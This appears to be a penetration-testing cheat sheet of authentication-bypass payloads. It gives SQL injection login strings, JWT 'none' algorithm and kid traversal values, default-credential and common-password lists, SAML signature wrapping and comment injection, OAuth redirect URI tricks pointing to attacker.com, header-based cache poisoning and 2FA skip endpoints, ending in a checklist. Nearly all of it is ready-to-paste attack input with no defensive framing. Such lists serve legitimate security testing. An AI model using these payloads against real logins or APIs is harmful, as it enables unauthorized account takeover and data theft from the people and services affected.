# Auth Bypass Payloads

## SQLi Auth Bypass

### Classic
```
admin' OR '1'='1'--
admin' OR 1=1--
' OR '1'='1' --
" OR "1"="1" --
') OR ('1'='1'--
") OR ("1"="1"--
```

### Hashed passwords
```
ffifdyop (MD5: 'or'6]!r,b)
' OR 1=1 -- (RAW MD5)
```

## JWT Auth Bypass

### None algorithm
```
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","role":"admin"}
```

### kid injection
```
"kid": "admin'--"
"kid": "../../dev/null"
```

## Basic Auth Bypass

### Default creds
```
admin:admin
admin:password
admin:123456
administrator:administrator
user:user
test:test
guest:guest
```

### Common passwords
```
password
123456
password123
admin123
Admin@123
letmein
welcome
qwerty
```

## API Key Bypass

### Missing auth
```
# Try without token
curl https://api.target.com/data

# Try with fake token
curl -H "Authorization: Bearer fake_token" https://api.target.com/data
```

### API key locations
```
X-API-Key
X-Api-Key
api_key
apiKey
apikey
Authorization: key
```

## Session Hijacking

### Cookie manipulation
```
# Fixate session
PHPSESSID=admin
JSESSIONID=admin

# Predictable sessions
session=1234567890
session=abc123

# Cookie decay
Set-Cookie: session=; expires=Thu, 01 Jan 1970
```

## SAML Bypass

### Comment injection
```
# In NameID field
admin<!---->@company.com
admin@company.com<!---->
```

### XML signature wrapping
```xml
<saml:Assertion>
  <ds:Signature>
    <!-- Valid signature from original assertion -->
  </ds:Signature>
  <samlAssertion> <!-- Inject another assertion -->
  </samlAssertion>
</saml:Assertion>
```

### Signature stripping
```xml
<!-- Remove signature, server might accept unsigned -->
```

### NameID manipulation
```
<NameID Format="...">admin@company.com</NameID>
<!-- Duplicate element -->
<NameID>admin@company.com</NameID>
<NameID>admin@company.com</NameID>
```

## OAuth Bypass

### Redirect URI manipulation
```
# Subdomain takeover
https://legitimate.com
https://legitimate.com.attacker.com
https://attacker-legitimate.com

# Parameter tricks
https://legitimate.com%2F.attacker.com
https://legitimate.com\.attacker.com
https://attacker.com/../legitimate.com
```

### State parameter
```
# Missing state - CSRF
https://api.target.com/oauth/authorize?client_id=xxx&redirect_uri=https://attacker.com/callback

# Weak state
state=12345
state=abc123
```

### Scope escalation
```
# Add scopes
scope=openid,profile,email,admin
scope=read,write,admin
```

## Basic Auth Header

```
Authorization: Basic YWRtaW46YWRtaW4=
# Decodes to admin:admin
```

## HTTP Basic Auth Bypass

### Test credentials
```
admin:admin
admin:password
admin:123456
root:root
root:toor
guest:guest
user:user
test:123456
```

### Basic Auth encode
```bash
echo -n "admin:password" | base64
# Use in header: Authorization: Basic BASE64STRING
```

## API Auth Bypass

### Missing Bearer token
```
curl https://api.target.com/endpoint
# vs
curl -H "Authorization: Bearer TOKEN" https://api.target.com/endpoint
```

### Weak token generation
```
# Try empty token
-H "Authorization: "

# Try generic tokens
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.qXYZ
```

## Cache Poisoning to Auth Bypass

```
# X-Forwarded-Host
X-Forwarded-Host: attacker.com

# X-Original-URL
X-Original-URL: /api/admin/users
```

## 2FA Bypass

### Session fixation
```
# Complete flow, fixate session before 2FA
```

### OTP prediction
```
# Low entropy OTPs
# Time-based OTP patterns
```

### Skip/Logic bypass
```
# Remove 2FA step via direct URL
/api/user/2fa/disable
/api/user/settings/mfa
```

## OAuth 2.0 Misconfigs

### Code interception
```
# If redirect_uri permits
https://legitimate.com/callback?code=STOLEN_CODE
```

### Token replay
```
# Replay authorization code
```

## JWT Authentication Bypass Patterns

| Vulnerability | Payload | Where |
|---|---|---|
| None alg | `{"alg":"none"}` | Header |
| Key confusion | Use RSA pub as HMAC key | Header |
| kid path traversal | `kid=../../etc/passwd` | Header |
| Weak secret | Bruteforce with wordlist | Signature |
| Algorithm confusion | RS256 → HS256 | Header |

## Auth Bypass Checklist

- [ ] SQLi in login form
- [ ] JWT none algorithm
- [ ] JWT key confusion
- [ ] JWT kid injection
- [ ] JWT weak secret brute
- [ ] Default creds
- [ ] Missing auth on protected endpoints
- [ ] Session fixation
- [ ] SAML signature bypass
- [ ] OAuth redirect URI manipulation
- [ ] HTTP Basic Auth decode
- [ ] API key enumeration
- [ ] 2FA bypass/ skip
- [ ] Header injection (X-Forwarded-Host)
- [ ] State parameter weakness